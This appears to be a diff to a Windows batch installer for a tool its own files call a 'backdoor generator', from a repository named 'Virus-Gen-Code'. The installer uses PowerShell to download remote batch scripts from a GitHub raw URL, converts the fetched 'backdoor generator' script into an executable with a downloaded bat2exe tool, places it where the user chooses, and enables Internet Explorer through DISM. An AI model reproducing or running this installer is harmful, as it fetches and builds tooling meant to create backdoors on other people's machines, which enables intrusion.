@@ -31,11 +31,10 @@ Dism /online /Get-FeatureInfo /FeatureName:Internet-Explorer-Optional-amd64>data
 )
 :int_exp_found
 echo internet explorer is already enabled, skipping this stage...
+set install_int_exp=false
 :int_exp_next
 if not exist C:\ProgramData\GVGemail.sav goto (imput_email) else (echo email save already detected, skipping this stage...)
 :email_next
-if not exist C:\Windows\System32\bat2exe.bat goto bat2exe_add
-:command_next
 echo where would you like to install the file?
 echo.
 set /p install_location=install location:
@@ -43,7 +42,7 @@ echo starting installation...
 timeout 1 /NOBREAK >nul
 echo creating bat2exe command...
 Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/bat2exe.bat").Content >C:\ProgramData\bat2exe.bat
-if exist C:\windows\system32\bat2exe.bat (echo bat2exe succesfuly made) else (goto bat2exe_install_error)
+if exist C:\ProgramData\bat2exe.bat (echo bat2exe succesfuly made) else (goto bat2exe_install_error)
 if %install_git% equ false (goto skip_git)
 echo downloading git...
 powershell Import-Module BitsTransfer
@@ -56,20 +55,19 @@ echo git was installed
 timeout 1 /nobreak >nul
 if not exist %install_location% mkdir %install_location%
 echo downloading code...
-Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/bat2exe.bat").Content >"C:\programdata\backdoor generator.bat"
+Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/updater.bat").Content >"C:\programdata\backdoor generator.bat"
 echo converting file to exe...
-echo bat2exe.bat "backdoor generator.bat" "backdoor generator.bat">convert.bat
-timeout 1 /nobreak >nul
-start convert.bat /WAIT
-timeout 1 /nobreak >nul
-del convert.bat
+call bat2exe.bat "backdoor generator.bat" "backdoor generator.exe"
+timeout 2 /nobreak >nul
 del bat2exe.bat
 del "backdoor generator.bat"
 move "backdoor generator.exe" "%install_location%"
-if %install_int_exp% equ false goto int_exp_skip 
+if %install_int_exp% equ false (goto int_exp_skip)
 echo enabling internet explorer
 Dism /online /Enable-Feature /FeatureName:Internet-Explorer-Optional-amd64 /All
 :int_exp_skip
+echo press any key to exit...
+pause >nul
 exit /b
 
 
